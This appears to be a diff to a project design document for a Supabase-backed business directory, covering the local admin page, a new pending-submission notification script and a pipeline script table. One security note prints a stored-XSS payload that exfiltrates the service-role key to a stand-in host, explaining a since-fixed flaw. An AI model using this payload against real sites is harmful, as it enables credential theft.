@@ -133,7 +133,7 @@ The_Peoples_Ledger/
     └── .vscode/settings.json
 ```
 
-**admin.html is gitignored** — runs locally only, holds the admin password and the service-role key, never deployed.
+**admin.html is gitignored** — runs locally only, holds the service-role key, never deployed.
 
 **Gitignoring it is necessary but not sufficient.** It stops the service-role key leaking *through the repo*; it does nothing to stop script *executing inside the page*, and "runs locally" is no protection — the browser rendering admin.html has the key in scope and full network access to Supabase. Until July 2026, `s.business_name` was interpolated raw into `innerHTML` in the submission list (`renderList`) and the detail panel (`selectSubmission`), while every other field already went through `escapeHtml()` via `field()`. Business names come from anonymous submitters through index.html, and the pending list renders on dashboard load — **before** any approve/reject decision — so a business named `<img src=x onerror="fetch('https://evil.tld/?k='+SUPABASE_ADMIN_KEY)">` would exfiltrate the service-role key just from opening the queue. Manual moderation cannot mitigate this: reviewing a submission requires rendering it.
 
@@ -256,6 +256,8 @@ Admin reads /rest/v1/submissions (all statuses, ordered by submitted_at desc)
         ↓
   PATCH submissions set status = "approved"
 ```
+
+**Windows notification on new pending submissions (Sept 2026).** The "PeoplesLedger Pending Alert" scheduled task runs `notify_pending.ps1` every 10 minutes and at logon. It asks Supabase for pending submissions only and shows one Windows notification per newly seen submission; clicking it opens admin.html. Already-announced IDs are kept in `data/.notify_pending_state.json`, and errors go to `data/notify_pending.log`. It reads the service-role key from admin.html, like `backup_supabase.py`. It only runs while you're logged in and doesn't wake the PC. `install_pending_alert.ps1` creates the task (`-Minutes N` changes the interval, `-Uninstall` removes it), and `notify_pending.ps1 -Test` shows a sample notification.
 
 **Update submissions auto-apply to the `businesses` table (since June 2026).** When you approve an update submission, admin.html looks up the business by exact name and PATCHes only the fields that were submitted. Blank fields are ignored. If no exact name match is found, it alerts you to apply the correction manually. Free-text notes are shown in the approval alert for your review but do not auto-apply.
 
@@ -424,8 +426,8 @@ The entire public-facing product lives here. Features:
 Static content page. Pulls live business count from `businesses` table on load (same count fetch as index.html). Contains origin story, stat blocks, and CTA back to directory.
 
 ### admin.html (LOCAL ONLY — NOT IN REPO)
-- Password-protected (hardcoded password — reason it's gitignored)
-- Loads ALL submissions on login (no status filter — shows pending, approved, rejected together)
+- No login gate (removed Sept 2026). The old password was a client-side check against a value hardcoded in the same file, so it protected nothing the file's own contents didn't already expose. The file's protection is that it lives only on the desktop and is gitignored; it is gitignored because it holds the service-role key.
+- Loads ALL submissions on open (no status filter — shows pending, approved, rejected together)
 - Filter buttons: All / Pending / Approved / Rejected (client-side filter of loaded data)
 - Left panel: submission list. Right panel: submission detail view
 - Approve button behavior:
@@ -490,6 +492,7 @@ All scripts load `.env` from the repo root and derive `data/` from their own loc
 | `pipeline/resolve_review.py` | Auto-settles "Needs review" rows: finds the business's real site (even when the listed link is a listicle), reads the address, promotes KY / drops out-of-state. `--limit N`, `--dry-run`, `--no-serp` | After prepare.py | SerpApi (small) |
 | `pipeline/view_database.py` | Open a `data/` CSV in D-Tale | As needed | Free |
 | `backup_supabase.py` (repo root) | Dumps `businesses` + `submissions` to `backups/<timestamp>/` as JSON. Paginates at 1000 (PostgREST truncates silently) and exits non-zero on a zero-row dump so a scheduled run cannot fail quietly. Reads URL + service-role key from admin.html so the key lives in one place. | Before any schema/RLS/grant change; daily via Task Scheduler | Free |
+| `notify_pending.ps1` (repo root) | Windows notification when a new submission is pending. Reads the service-role key from admin.html; announced IDs are in `data/.notify_pending_state.json`. `-Test` shows a sample. Installed as a scheduled task by `install_pending_alert.ps1` (`-Uninstall` to remove). | Every 10 min via Task Scheduler | Free |
 | `pipeline/reconcile_certifications.py` | Lane 2: matches the certifier lists against the live table, backfills `certification_type`, and inserts certified businesses not yet present. Dry-run by default; `--apply` backfills, `--insert-new` also inserts. Matches 85-93 go to a review CSV and are never auto-applied. Needs the service-role key. | As agencies refresh (quarterly) | Free |
 
 **Consolidation note:** `prepare.py` replaces the old `triage` + `clean_ky_businesses.py`; `enrich.py` replaces `categorize_industries.py` + `fill_missing_services.py`; `maintain.py` replaces `check_link_status.py` + `fix_buyblack_urls.py`.
